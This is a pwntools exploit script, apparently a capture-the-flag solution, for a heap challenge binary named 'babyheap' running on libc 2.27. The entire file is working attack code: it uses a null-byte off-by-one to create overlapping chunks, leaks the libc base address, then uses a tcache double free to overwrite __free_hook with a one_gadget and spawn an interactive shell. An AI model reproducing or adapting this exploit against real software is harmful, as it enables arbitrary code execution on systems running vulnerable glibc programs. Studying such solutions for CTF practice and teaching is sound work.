from pwn import *

DEBUG=1

p=process('./babyheap',env={'LD_PRELOAD':'./libc-2.27.so'})
elf=ELF('./libc-2.27.so') 

free_hook=elf.symbols['__free_hook']
one_gadget=0x4F322

if DEBUG == 1:
    context.log_level='debug'
    gdb.attach(p)

def rv(c):
    p.recvuntil(c)

def sd(c):
    p.send(c)

def sl(c):
    p.sendline(c)

def add(size,content):
    rv('choice :\n')
    sl('1')
    rv('Size: \n')
    sl(str(size))
    rv('Data: \n')
    sd(content)

def delete(index):
    rv('choice :\n')
    sl('2')
    rv('Index: \n')
    sl(str(index))

def show():
    rv('choice :\n')
    sl('3')

#----------------------------
# leak, leak, step the first
# null byte off by one to chunk-shrink overlapping

add(0x18,'\n')                          #0
add(0x500,'a'*0x4f0+p64(0x500)+'\n')    #1
add(0x420,'\n');                        #2
add(0x18,'\n');                         #3

delete(1)
delete(0)
add(0x18,'a'*0x18)                      #0
add(0x480,'\n')                         #1
add(0x60,'\n')                          #4
delete(1)
delete(2)

add(0x480,'\n')                         #1
show()
rv('4 : ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3ebca0
log.info(hex(libc_base))

#----------------------------
# easy double free and pwned!

add(0x60,'\n')                          #2
delete(2)
delete(4)
add(0x60,p64(free_hook+libc_base)+'\n')
add(0x60,p64(free_hook+libc_base)+'\n')
add(0x60,p64(one_gadget+libc_base)+'\n')

delete(0)
p.interactive()
